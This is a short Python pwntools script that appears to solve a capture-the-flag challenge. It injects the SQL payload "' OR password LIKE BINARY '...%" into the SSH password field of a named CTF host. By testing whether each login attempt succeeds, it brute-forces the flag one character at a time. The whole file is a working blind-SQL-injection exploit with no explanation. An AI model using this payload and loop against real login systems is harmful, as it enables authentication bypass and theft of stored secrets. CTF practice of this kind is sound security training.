#!/usr/bin/env python3

from pwn import *

password = 'midnight{'
win = False
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-}"

char = alphabet[0]

def nextchar(char):
    i = alphabet.index(char)
    i += 1

    return alphabet[i]

def guess(char):
    return "' OR password LIKE BINARY '{}%".format(password + char)

while not win:
    sqli = guess(char)

    print(sqli)
    try:
        io = ssh(
                host = 'fsociety-02.play.midnightsunctf.se',
                port = 2222,
                user = 'elliot',
                password = sqli,
                )
        io.close()

        password += char
        char = alphabet[0]
    except:
        char = nextchar(char)
        if char == '}':
            win = True
            password += char

print(password)

